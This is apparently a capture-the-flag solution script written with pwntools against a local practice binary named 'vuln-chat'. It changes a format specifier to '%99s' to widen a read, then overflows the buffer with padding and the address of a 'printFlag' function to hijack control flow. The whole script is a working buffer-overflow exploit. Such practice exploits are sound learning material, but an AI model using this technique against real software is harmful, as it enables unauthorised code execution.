#!/usr/bin/env python3

from pwn import *

context.terminal = ["tmux", "splitw", "-h"]
gdbcmds = """
b * main + 71
b * main + 170
c
c
"""

elf = context.binary = ELF("./vuln-chat")
p = process(elf.path)
p = gdb.debug(elf.path, gdbscript=gdbcmds)

payload = b"A" * 20
payload += b"%99s"
p.sendline(payload)

payload = b"B" * 49
payload += p64(elf.symbols["printFlag"])
p.sendline(payload)

p.interactive()
